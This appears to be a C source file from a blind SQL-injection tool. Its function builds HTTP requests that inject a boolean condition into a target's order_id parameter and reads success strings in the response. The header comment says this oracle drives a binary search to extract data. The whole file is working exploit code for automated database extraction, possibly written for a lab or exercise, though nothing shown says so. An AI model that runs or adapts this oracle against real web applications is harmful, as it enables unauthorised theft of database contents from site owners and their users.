/*
 * http_oracle.c
 *
 * Implementation of the boolean SQL-injection oracle.
 *
 * A hard network error aborts the program rather than returning a value: a
 * failed request carries no boolean information, and treating it as "false"
 * would silently corrupt the binary search that drives data extraction.
 */

#include "http_oracle.h"
#include "net_io.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

#include "url_encode.h"

#define ENCODED_MAX  2048
#define REQUEST_MAX  4096
#define RESPONSE_MAX 65536

bool sqli_oracle(const char *condition)
{
    if (condition == NULL) {
        return false;
    }

    char encoded[ENCODED_MAX];
    if (url_encode(encoded, sizeof(encoded), condition) != 0) {
        fprintf(stderr, "Error: condition too long to encode.\n");
        exit(1);
    }

    /* Keep the base query valid with a known-good order id, then append the
     * injected boolean condition. Spaces around AND are pre-encoded. */
    char request[REQUEST_MAX];
    int len = snprintf(request, sizeof(request),
        "GET /index.php?order_id=%s%%20AND%%20(%s)&Submit=Check+Status HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        GOOD_ORDER_ID, encoded, SQLI_TARGET_IP);
    if (len < 0 || (size_t)len >= sizeof(request)) {
        fprintf(stderr, "Error: request buffer too small.\n");
        exit(1);
    }

    int fd = connect_tcp(SQLI_TARGET_IP, (uint16_t)SQLI_TARGET_PORT);
    if (fd < 0) {
        fprintf(stderr, "Error: connection to target failed.\n");
        exit(1);
    }

    if (send_all(fd, request, (size_t)len) != 0) {
        fprintf(stderr, "Error: sending request failed.\n");
        (void)close(fd);
        exit(1);
    }

    char response[RESPONSE_MAX];
    size_t total = 0;
    while (total < sizeof(response) - 1) {
        ssize_t n = recv(fd, response + total, sizeof(response) - 1 - total, 0);
        if (n <= 0) {
            break;
        }
        total += (size_t)n;
    }
    response[total] = '\0';
    (void)close(fd);

    return strstr(response, "Your order has been sent!") != NULL ||
           strstr(response, "The order has been sent") != NULL;
}
